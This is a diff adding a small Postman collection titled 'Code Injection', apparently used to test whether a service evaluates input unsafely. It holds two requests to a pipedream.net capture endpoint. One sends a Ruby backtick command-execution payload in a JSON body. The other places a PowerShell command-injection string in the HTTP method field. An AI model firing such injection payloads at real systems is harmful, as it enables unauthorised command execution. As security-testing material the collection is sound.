@@ -1,0 +1,67 @@
+{
+	"info": {
+		"_postman_id": "e215c6f5-a197-4b9f-80cf-5d5975558b45",
+		"name": "Code Injection",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "10909477"
+	},
+	"item": [
+		{
+			"name": "Ruby code injection",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"hi\": \"#{`dir`}\"\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://eoniw8219k267zc.m.pipedream.net",
+					"protocol": "https",
+					"host": [
+						"eoniw8219k267zc",
+						"m",
+						"pipedream",
+						"net"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Powershell command injection",
+			"request": {
+				"method": "TEST';DIR;#'",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "this is a sample",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://eoniw8219k267zc.m.pipedream.net/",
+					"protocol": "https",
+					"host": [
+						"eoniw8219k267zc",
+						"m",
+						"pipedream",
+						"net"
+					],
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
